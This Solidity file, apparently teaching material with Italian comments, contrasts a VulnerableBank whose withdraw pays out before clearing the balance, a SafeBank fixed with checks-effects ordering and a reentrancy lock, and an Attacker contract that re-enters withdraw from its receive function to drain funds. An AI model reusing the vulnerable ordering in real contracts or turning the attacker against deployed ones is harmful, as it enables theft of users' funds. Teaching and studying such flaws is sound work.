// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableBank {
    mapping(address => uint256) public balance;
    function deposit() external payable { balance[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 v = balance[msg.sender];
        require(v > 0, "vuoto");
        (bool ok, ) = msg.sender.call{value: v}("");   // interaction PRIMA dell'effect
        require(ok, "invio fallito");
        balance[msg.sender] = 0;
    }
}

contract SafeBank {
    mapping(address => uint256) public balance;
    bool private locked;
    modifier nonReentrant() {
        require(!locked, "rientro vietato");
        locked = true;
        _;
        locked = false;
    }
    function deposit() external payable { balance[msg.sender] += msg.value; }
    function withdraw() external nonReentrant {
        uint256 v = balance[msg.sender];
        require(v > 0, "vuoto");
        balance[msg.sender] = 0;                        // effect prima
        (bool ok, ) = msg.sender.call{value: v}("");
        require(ok, "invio fallito");
    }
}

interface IBank { function deposit() external payable; function withdraw() external; }

contract Attacker {
    IBank public bank;
    uint256 public reentries;
    constructor(IBank b) { bank = b; }
    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
    receive() external payable {
        if (address(bank).balance >= msg.value && reentries < 10) {
            reentries++;
            bank.withdraw();                            // rientra finché la banca ha fondi
        }
    }
}
